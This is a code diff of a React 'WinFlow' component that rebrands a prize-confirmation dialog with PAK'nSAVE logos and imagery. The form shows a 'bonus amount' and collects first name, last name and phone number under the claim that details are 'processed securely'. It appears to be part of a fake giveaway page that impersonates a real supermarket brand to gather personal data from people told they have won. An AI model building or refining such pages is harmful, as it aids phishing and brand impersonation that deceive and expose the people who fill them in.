@@ -142,67 +142,75 @@ export function WinFlow({ sessionId }: Props) {
         <div
           role="dialog"
           aria-modal="true"
-          className="relative w-full max-w-[650px] overflow-hidden rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)]"
+          className="pak-form-card w-full max-w-[980px]"
         >
-          <div className="px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10">
-            {/* Top Section with Gift Box */}
-            <div className="relative mb-4 sm:mb-6">
-              <div className="pr-24 sm:pr-48">
-                <h2 className="text-lg font-bold text-white sm:text-2xl leading-tight">
-                  Complete your entry
-                </h2>
-                <p className="mt-1 text-[11px] text-gray-300 sm:text-sm sm:mt-2">
-                  Enter your details to complete prize confirmation.
-                </p>
-                <div className="mt-3 flex items-center justify-between rounded-xl bg-[#0066CC] px-4 py-2.5 sm:mt-4 sm:px-5 sm:py-3 w-max gap-4 sm:gap-8">
-                  <div className="leading-tight text-left">
-                    <div className="text-[11px] font-bold text-white/90 sm:text-xs">Your</div>
-                    <div className="text-xs font-bold text-white sm:text-sm">bonus amount</div>
+          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
+            <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
+              <div className="min-w-0">
+                <div className="max-w-[34rem]">
+                  <h2 className="pak-form-title">Complete your entry</h2>
+                  <p className="pak-form-subtitle mt-3">
+                    Enter your details to complete your prize confirmation.
+                  </p>
+                </div>
+                <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
+                  <div className="pak-form-amount-label">
+                    <div>Your</div>
+                    <div>Bonus Amount</div>
                   </div>
-                  <div className="flex items-center gap-1.5 sm:gap-2">
-                    <span className="text-xl font-black text-white sm:text-2xl">{currency}</span>
-                    <span className="text-2xl font-black text-white sm:text-3xl">{amount?.toLocaleString("en-NZ")}</span>
+                  <div className="pak-form-amount-divider" />
+                  <div className="pak-form-amount-value">
+                    {currency}{amount?.toLocaleString("en-NZ")}
                   </div>
                 </div>
               </div>
-              
-              {/* Gift Box Image */}
-              <div className="absolute right-[-15px] top-[-15px] w-24 sm:right-[-10px] sm:top-[-30px] sm:w-44 pointer-events-none">
+
+              <div className="flex items-start justify-between gap-4 lg:block">
                 <img
-                  src="/form-assets/gift-box.png"
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
+                />
+                <img
+                  src="/form-assets/paknsave-gift-box.png"
                   alt=""
-                  className="h-auto w-full object-contain drop-shadow-[0_18px_30px_rgba(0,0,0,0.4)]"
+                  className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
                 />
               </div>
             </div>
 
-            {/* Form */}
-            <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
-              <div className="grid grid-cols-1 gap-3 sm:gap-4 sm:grid-cols-2">
-                <label className="block text-[13px] font-medium text-white sm:text-sm">
+            <form onSubmit={handleSubmit} className="mt-7 space-y-5 sm:space-y-6">
+              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 sm:gap-6">
+                <label className="pak-form-label">
                   {settings.profile_firstname_label}
-                  <div className="relative mt-1">
-                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
-                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
+                  <div className="pak-form-input-wrap">
+                    <div className="pak-form-input-icon">
+                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
+                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
+                      </svg>
                     </div>
                     <input
                       required
-                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
+                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                       value={firstName}
                       onChange={(e) => setFirstName(e.target.value)}
                       autoComplete="given-name"
                     />
                   </div>
                 </label>
-                <label className="block text-[13px] font-medium text-white sm:text-sm">
+                <label className="pak-form-label">
                   {settings.profile_lastname_label}
-                  <div className="relative mt-1">
-                    <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
-                      <img src="/form-assets/icon-person.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
+                  <div className="pak-form-input-wrap">
+                    <div className="pak-form-input-icon">
+                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
+                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
+                      </svg>
                     </div>
                     <input
                       required
-                      className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
+                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                       value={lastName}
                       onChange={(e) => setLastName(e.target.value)}
                       autoComplete="family-name"
@@ -210,16 +218,18 @@ export function WinFlow({ sessionId }: Props) {
                   </div>
                 </label>
               </div>
-              <label className="block text-[13px] font-medium text-white sm:text-sm">
+              <label className="pak-form-label">
                 {settings.profile_phone_label}
-                <div className="relative mt-1">
-                  <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
-                    <img src="/form-assets/icon-phone.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain opacity-70" />
+                <div className="pak-form-input-wrap">
+                  <div className="pak-form-input-icon">
+                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                      <path d="M6.6 3.8h2.6l1.2 4.3-1.6 1.6a15.9 15.9 0 0 0 5.5 5.5l1.6-1.6 4.3 1.2v2.6a1.9 1.9 0 0 1-2.1 1.9A16.2 16.2 0 0 1 4.7 6a1.9 1.9 0 0 1 1.9-2.2Z" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
                   </div>
                   <input
                     required
                     type="tel"
-                    className="block w-full rounded-xl border border-transparent bg-white py-2.5 sm:py-3 pl-9 sm:pl-10 pr-3 text-sm sm:text-base text-gray-900 shadow-sm transition-colors placeholder:text-gray-400 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
+                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                     value={phone}
                     onChange={(e) => setPhone(e.target.value)}
                     autoComplete="tel"
@@ -227,21 +237,24 @@ export function WinFlow({ sessionId }: Props) {
                 </div>
               </label>
 
-              {/* Security Text */}
-              <div className="mt-3 sm:mt-4 flex items-center gap-2">
-                <img src="/form-assets/icon-security.png" alt="" className="h-4 w-4 sm:h-5 sm:w-5 object-contain" />
-                <span className="text-[11px] sm:text-sm text-gray-300">Your information is processed securely.</span>
+              <div className="flex flex-col gap-4 pt-2 md:flex-row md:items-center md:justify-between">
+                <div className="pak-form-security">
+                  <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                    <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
+                  </svg>
+                  <span>Your details are processed securely.</span>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={saving || processing}
+                  className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+                >
+                  {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
+                </button>
               </div>
 
               {error ? <p className="text-sm font-medium text-red-400">{error}</p> : null}
-
-              <button
-                type="submit"
-                disabled={saving || processing}
-                className="mt-4 sm:mt-6 w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-3.5 sm:py-4 text-base sm:text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-              >
-                {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
-              </button>
             </form>
           </div>
         </div>
